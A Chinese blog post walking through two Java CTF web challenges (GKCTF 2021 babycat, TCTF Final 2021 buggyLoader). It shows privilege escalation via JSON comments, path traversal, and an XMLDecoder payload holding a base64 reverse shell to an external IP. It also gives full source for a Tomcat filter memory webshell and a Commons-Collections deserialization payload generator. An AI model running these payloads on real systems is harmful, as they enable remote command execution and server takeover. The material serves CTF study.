@@ -1,0 +1,1394 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>比赛中的Java题目 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="比赛中的Java题目 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="2021年
+[GKCTF 2021]babycat
+进入题目，是一个登录框，点击注册，发现不让你注册，查看源代码看到
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Register&lt;/title..." />
+    <meta name="keywords" content="Java,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              比赛中的Java题目
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-19
+              </span>
+              <span>
+                33 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/asK-y0e-9sI/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="2021年">2021年</h2>
+<h3 id="gkctf-2021babycat">[GKCTF 2021]babycat</h3>
+<p>进入题目，是一个登录框，点击注册，发现不让你注册，查看源代码看到</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Register&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;alert('Not Allowed')&lt;/script&gt;
+&lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    // var obj={};
+    // obj[&quot;username&quot;]='test';
+    // obj[&quot;password&quot;]='test';
+    // obj[&quot;role&quot;]='guest';
+    function doRegister(obj){
+        if(obj.username==null || obj.password==null){
+            alert(&quot;用户名或密码不能为空&quot;);
+        }else{
+            var d = new Object();
+            d.username=obj.username;
+            d.password=obj.password;
+            d.role=&quot;guest&quot;;
+
+            $.ajax({
+                url:&quot;/register&quot;,
+                type:&quot;post&quot;,
+                contentType: &quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
+                data: &quot;data=&quot;+JSON.stringify(d),
+                dataType: &quot;json&quot;,
+                success:function(data){
+                    alert(data)
+                }
+            });
+        }
+    }
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4 id="账号注册">账号注册</h4>
+<p>发现一个注册接口，通过post发包注册</p>
+<pre><code class="language-json">data={&quot;username&quot;:&quot;Le1a2333&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;role&quot;:&quot;&quot;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419191941792.png" alt="image-20220419191941792" loading="lazy"></figure>
+<h4 id="任意文件读取">任意文件读取</h4>
+<p>进去之后，有一个文件上传，不过只有<code>role</code>为admin才可以，还可以有一个<code>DownLoadTest</code>，点击下载然后抓包，看到了<code>../../</code>，这就判断可以任意文件读取了，先读一下xml</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419192041144.png" alt="image-20220419192041144" loading="lazy"></figure>
+<pre><code class="language-xml">&lt;!DOCTYPE web-app PUBLIC
+ &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
+ &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;
+
+&lt;web-app&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;display-name&gt;java&lt;/display-name&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;filter&gt;
+    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;
+  &lt;/filter&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;
+  &lt;display-name&gt;java&lt;/display-name&gt;
+
+  &lt;welcome-file-list&gt;
+    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;
+  &lt;/welcome-file-list&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>按照xml中的项目结构，依次读取class文件，然后<code>jd-gui</code>反编译之后用IDEA打开分析一下代码</p>
+<h4 id="越权admin">越权admin</h4>
+<p>先来看<code>registerServlet</code>，接收<code>data</code>，正则匹配<code>&quot;role&quot;:&quot;(.*?)&quot;</code>，它会正则匹配我们注册时传入的json数据包的所有role部分</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419162403498.png" alt="image-20220419162403498" loading="lazy"></figure>
+<p>这里会对最后一个匹配的进行强制替换，因为while循环赋值到一个变量上，所以该变量实际上是匹配到的最后一个结果。如果匹配到的role为空，则会填充为默认值<code>guest</code>，如果匹配到的role，还是会被替换为<code>guest</code>，注意到这里是使用的gson对json进⾏解析，我们可以通过多行注释来达到<code>role</code>为<code>admin</code>，例如：</p>
+<pre><code class="language-json">data={&quot;username&quot;:&quot;Le1a&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;role&quot;:&quot;admin&quot;/*, &quot;role&quot;:&quot;le1a2333&quot;*/}
+</code></pre>
+<p>如上payload，被替换之后的payload为:</p>
+<pre><code class="language-json">data={&quot;username&quot;:&quot;Le1a&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;role&quot;:&quot;admin&quot;/*, &quot;role&quot;:&quot;guest&quot;*/}
+//等同为
+data={&quot;username&quot;:&quot;Le1a&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;role&quot;:&quot;admin&quot;}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419163917928.png" alt="image-20220419163917928" loading="lazy"></figure>
+<p>所以注册得到admin权限，接下来我们看看<code>uploadServlet</code>的内容,可以看见这里检查后缀的白名单和检查内容的黑名单，过滤得非常严格的</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419164104291.png" alt="image-20220419164104291" loading="lazy"></figure>
+<h4 id="xmldecoder反序列化">XMLDecoder反序列化</h4>
+<p>再来看看其他文件，以同样的方式下载下来</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419165053520.png" alt="image-20220419165053520" loading="lazy"></figure>
+<pre><code class="language-java">package com.web.dao;
+
+import java.beans.XMLDecoder;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.util.HashMap;
+
+public class baseDao {
+    private static String driver;
+
+    private static String url;
+
+    private static String username;
+
+    private static String password;
+
+    public static Connection connection;
+
+    static {
+        try {
+            getConfig();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void getConfig() throws FileNotFoundException {
+        Object obj = (new XMLDecoder(new FileInputStream(System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/db/db.xml&quot;))).readObject();
+        if (obj instanceof HashMap) {
+            HashMap map = (HashMap)obj;
+            if (map != null &amp;&amp; map.get(&quot;url&quot;) != null) {
+                driver = (String)map.get(&quot;driver&quot;);
+                url = (String)map.get(&quot;url&quot;);
+                username = (String)map.get(&quot;username&quot;);
+                password = (String)map.get(&quot;password&quot;);
+            }
+        }
+    }
+
+    public static Connection getConnection() throws Exception {
+        getConfig();
+        if (connection == null)
+            try {
+                Class.forName(driver);
+                connection = DriverManager.getConnection(url, username, password);
+            } catch (SQLException|ClassNotFoundException e) {
+                e.printStackTrace();
+            }
+        return connection;
+    }
+
+    public static ResultSet execute(Connection connection, String sql, Object[] params) throws SQLException {
+        PreparedStatement preparedStatement = connection.prepareStatement(sql);
+        for (int i = 0; i &lt; params.length; i++)
+            preparedStatement.setObject(i + 1, params[i]);
+        ResultSet rs = preparedStatement.executeQuery();
+        return rs;
+    }
+
+    public static int Update(Connection connection, String sql, Object[] params) throws SQLException {
+        PreparedStatement preparedStatement = connection.prepareStatement(sql);
+        for (int i = 0; i &lt; params.length; i++)
+            preparedStatement.setObject(i + 1, params[i]);
+        int updateRows = preparedStatement.executeUpdate();
+        return updateRows;
+    }
+
+    public static boolean closeResource(Connection connection, ResultSet result, PreparedStatement preparedStatement) {
+        boolean flag = true;
+        if (result != null) {
+            try {
+                result.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+                flag = false;
+            }
+            result = null;
+        }
+        if (preparedStatement != null) {
+            try {
+                preparedStatement.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+                flag = false;
+            }
+            preparedStatement = null;
+        }
+        return flag;
+    }
+}
+</code></pre>
+<p>HelloController</p>
+<pre><code class="language-java">package com.web.dao;
+
+
+public class Person {
+    public String username;
+
+    public String password;
+
+    public String role;
+
+    public String pic;
+
+    public Person() {}
+
+    public String getPic() {
+        return this.pic;
+    }
+
+    public void setPic(String pic) {
+        this.pic = pic;
+    }
+
+    public Person(String username, String password, String role, String pic) {
+        this.username = username;
+        this.password = password;
+        this.role = role;
+        this.pic = pic;
+    }
+
+    public String getUsername() {
+        return this.username;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    public String getPassword() {
+        return this.password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String getRole() {
+        return this.role;
+    }
+
+    public void setRole(String role) {
+        this.role = role;
+    }
+
+    public String toString() {
+        return &quot;Person{username='&quot; + this.username + '\'' + &quot;, password='&quot; + this.password + '\'' + &quot;, role='&quot; + this.role + '\'' + &quot;, pic='&quot; + this.pic + '\'' + '}';
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419165326374.png" alt="image-20220419165326374" loading="lazy"></figure>
+<p>这里是存在XMLDecoder漏洞的，可以上传进行目录穿越覆盖db.xml</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419165748740.png" alt="image-20220419165748740" loading="lazy"></figure>
+<p><code>getConnection()</code>调用了getConfig，而<code>loginServlet</code>又在<code>doPost</code>方法中调用了<code>getConnection()</code>，所以我们登录(或注册)就可以触发xml反序列化漏洞。</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;java&gt;
+ &lt;object class=&quot;java.lang.&amp;#80;rocessBuilder&quot;&gt;
+  &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+  &lt;void index=&quot;0&quot;&gt;
+  &lt;string&gt;/bin/bash&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void index=&quot;1&quot;&gt;
+  &lt;string&gt;-c&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void index=&quot;2&quot;&gt;
+
+
+&lt;string&gt;{echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMSc=}|{base64,-d}|{bash,-i}&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;/array&gt;
+  &lt;void method=&quot;start&quot;/&gt;
+ &lt;/object&gt;
+&lt;/java&gt;
+</code></pre>
+<p>上传文件抓包，把文件名改为<code>../../db/db.xml</code>，然后发送过去，返回状态码为200就成功替换了。退出账号重新登录，就会触发命令反弹shell的命令了。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220419190858724.png" alt="image-20220419190858724" loading="lazy"></figure>
+<pre><code class="language-flag">NSSCTF{7ea8d5cd-d3f7-4f64-95c6-ea74c3575860}
+</code></pre>
+<h3 id="tctf0ctf-final-2021-buggyloader-only-2-solved">[TCTF/0CTF Final 2021] buggyloader (only 2 solved)</h3>
+<p>环境搭建: https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader/deploy</p>
+<p>题目给了Dockerfile和题目源码，把这个jar包丢到IDEA里反编译一下。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220429213251030.png" alt="image-20220429213251030" loading="lazy"></figure>
+<p>这里有一个basic路由，读取一个参数进来，然后分别读取一个UTF和一个Int，如果 <code>name.equals(&quot;SJTU&quot;) &amp;&amp; year == 1896</code>，那么就进行一个反序列化的操作。</p>
+<p>注意到这里是用的自定义的字节输入流，不是用的系统默认的，来看一下二者的区别:</p>
+<p><strong>MyObjectInputStream</strong></p>
+<pre><code class="language-java">public class MyObjectInputStream extends ObjectInputStream {
+    private ClassLoader classLoader;
+
+    public MyObjectInputStream(InputStream inputStream) throws Exception {
+        super(inputStream);
+        URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();
+        this.classLoader = new URLClassLoader(urls);
+    }
+
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+        Class clazz = this.classLoader.loadClass(desc.getName());
+        return clazz;
+    }
+}
+</code></pre>
+<p>这里重写了ObjectInputStream的resolveClass方法</p>
+<p><strong>ObjectInputStream#resolveClass</strong></p>
+<pre><code class="language-java">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)
+    throws IOException, ClassNotFoundException
+{
+    String name = desc.getName();
+    try {
+        return Class.forName(name, false, latestUserDefinedLoader());
+    } catch (ClassNotFoundException ex) {
+        Class&lt;?&gt; cl = primClasses.get(name);
+        if (cl != null) {
+            return cl;
+        } else {
+            throw ex;
+        }
+    }
+}
+</code></pre>
+<p>二者的区别就是，原生的<code>resolveClass</code>使用的是<code>Class.forName</code>，而本题改为了<code>classLoader.loadClass</code>。他们有什么区别呢?</p>
+<ol>
+<li>Class.forName会解析数组类型，如<code>[Ljava.lang.String;</code></li>
+<li>ClassLoader不会解析数组类型，加载时会抛出<code>ClassNotFoundException;</code></li>
+</ol>
+<p>P神结论：<code>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</code> 具体分析详见: <a href="http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/">@ttpfx</a></p>
+<h4 id="方法1-templatesimpl">方法1 TemplatesImpl</h4>
+<p>之前Shiro用到的TemplatesImpl类，通过<code>javassist</code>将恶意类字节码传递给<code>TemplatesImpl </code>来RCE，但是这题用不了，原因是Shiro使用的Tomcat的<code>ParallelWebAppClassLoader</code>的loadClass进行加载，而这题使用的<code>URLClassLoader</code></p>
+<h4 id="方法2-rmiconnectorserver">方法2 RMIConnectorServer</h4>
+<p>绕过这些限制可以通过二次反序列化来绕过，在RMI中的<code>StreamRemoteCall</code>类中的<code>getInputStream()</code>方法中</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430144840322.png" alt="image-20220430144840322" loading="lazy"></figure>
+<p>他把原来的一个输出流进行了一个转化，变成了一个新的输出流，那么原来的一些限制也就不存在了，接下来在<code>executeCall()</code>方法中对刚才的<code>getInputStream()</code>进行一个调用，然后对这个输入流进行一个反序列化的操作。</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430144952330.png" alt="image-20220430144952330" loading="lazy"></figure>
+<p>所以就需要找到一个类中存在一个新建输入流的方法，并且是无参、public属性、可序列化、不能含有数组的类，最终是找到了 <code>RMIConnectorServer</code>类</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430150338804.png" alt="image-20220430150338804" loading="lazy"></figure>
+<p>这里的connect方法调用了<code>findRMIServer</code>方法，传入了一个URL，跟进这个方法，发现是根据传入的URL，来调用不同的函数</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430150500688.png" alt="image-20220430150500688" loading="lazy"></figure>
+<p>所以这里只需要控制URL，就能调用<code>findRMIServerJRMP</code>方法，跟进这个方法</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430150752643.png" alt="image-20220430150752643" loading="lazy"></figure>
+<p>这里是传入Base64，然后转为字节数组，然后传入输入流，然后进行反序列化。</p>
+<p>然后这个传入的URL格式就是<code>service:jmx:iiop:///stub/base64</code></p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430151205824.png" alt="image-20220430151205824" loading="lazy"></figure>
+<p>构造RMIConnector对象</p>
+<pre><code class="language-java">private static Object getObject() throws Exception{
+    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:iiop:///stub/Base64&quot;);
+    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());
+    return rmiConnector;
+}
+</code></pre>
+<p>因为这题是不出网的，所以这里选择注入内存马。又因为CC3中使用了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类，这个类在高版本中是没有的，所以前半部分用CC3，后半部分用CC6的。流程图如下</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430152019118.png" alt="image-20220430152019118" loading="lazy"></figure>
+<p><strong>Filter内存马</strong></p>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Map;
+
+public class TomcatFilterMemShellFromThread extends AbstractTranslet implements Filter {
+    static {
+        try {
+            final String name = &quot;MyFilterVersion&quot; + System.nanoTime();
+            final String URLPattern = &quot;/*&quot;;
+
+            WebappClassLoaderBase webappClassLoaderBase =
+                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            Class&lt;? extends StandardContext&gt; aClass = null;
+            try {
+                aClass = (Class&lt;? extends StandardContext&gt;) standardContext.getClass().getSuperclass();
+                aClass.getDeclaredField(&quot;filterConfigs&quot;);
+            } catch (Exception e) {
+                aClass = (Class&lt;? extends StandardContext&gt;) standardContext.getClass();
+                aClass.getDeclaredField(&quot;filterConfigs&quot;);
+            }
+            Field Configs = aClass.getDeclaredField(&quot;filterConfigs&quot;);
+            Configs.setAccessible(true);
+            Map filterConfigs = (Map) Configs.get(standardContext);
+
+            TomcatFilterMemShellFromThread behinderFilter = new TomcatFilterMemShellFromThread();
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(behinderFilter);
+            filterDef.setFilterName(name);
+            filterDef.setFilterClass(behinderFilter.getClass().getName());
+            /**
+             * 将filterDef添加到filterDefs中
+             */
+            standardContext.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern(URLPattern);
+            filterMap.setFilterName(name);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+            standardContext.addFilterMapBefore(filterMap);
+
+            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+
+            filterConfigs.put(name, filterConfig);
+        } catch (Exception e) {
+//            e.printStackTrace();
+        }
+    }
+
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        HttpServletRequest req = (HttpServletRequest) servletRequest;
+        if (req.getParameter(&quot;c&quot;) != null){
+            Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line = null;
+            StringBuffer sb = new StringBuffer();
+            while ((line = br.readLine()) != null){
+                sb.append(line + System.getProperty(&quot;line.separator&quot;));
+            }
+
+            servletResponse.getWriter().write(new String(sb));
+            process.destroy();
+            return;
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p><strong>Evil类</strong></p>
+<pre><code class="language-java">package com.le1a.ctf.tctf;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CCTest3 {
+
+    public static void main(String[] args) throws Exception{
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc = templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\ShiroAttck\\target\\classes\\ShiroCB\\TomcatFilterMemShellFromThread.class&quot;));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                instantiateTransformer
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);
+
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+        map2.put(tiedMapEntry, &quot;bbb&quot;);
+        lazyMap.remove(&quot;aaa&quot;);
+
+        Class c = LazyMap.class;
+        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+        factoryField.setAccessible(true);
+        factoryField.set(lazyMap,chainedTransformer);
+
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(map2);
+
+        byte[] payload = byteArrayOutputStream.toByteArray();
+        String finalPayload = Base64.getEncoder().encodeToString(payload);
+        System.out.println(finalPayload);
+
+
+    }
+}
+</code></pre>
+<p>运行得到payload1</p>
